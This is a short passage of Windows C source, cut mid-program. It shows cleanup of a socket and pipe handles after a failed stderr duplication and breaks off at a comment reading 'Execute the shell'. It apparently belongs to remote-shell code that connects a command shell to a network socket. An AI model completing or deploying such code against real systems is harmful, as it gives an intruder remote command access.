        closesocket(sock);
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        printf("Failed to duplicate stderr handle: %d\n", GetLastError());
        return;
    }

    // Close the original handles
    CloseHandle(hReadPipe);
    CloseHandle(hWritePipe);

    // Execute the shell
